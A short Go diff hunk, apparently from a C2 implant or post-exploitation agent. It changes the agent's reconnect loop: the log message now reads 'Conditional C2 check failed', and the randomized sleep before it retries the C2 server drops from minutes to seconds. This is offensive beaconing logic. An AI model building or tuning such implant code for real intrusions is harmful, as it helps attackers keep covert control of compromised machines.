@@ -286,11 +286,11 @@ connect:
 	if agent.RuntimeConfig.IndicatorWaitMax > 0 &&
 		agent.RuntimeConfig.CCIndicatorURL != "" { // check indicator URL or not
 		if !agent.ConditionalC2Yes(agent.RuntimeConfig.C2TransportProxy) {
-			log.Println("CC not online")
+			log.Println("Conditional C2 check failed, sleeping, will retry later")
 			time.Sleep(time.Duration(
 				util.RandInt(
 					agent.RuntimeConfig.IndicatorWaitMin,
-					agent.RuntimeConfig.IndicatorWaitMax)) * time.Minute)
+					agent.RuntimeConfig.IndicatorWaitMax)) * time.Second)
 			goto connect
 		}
 	}
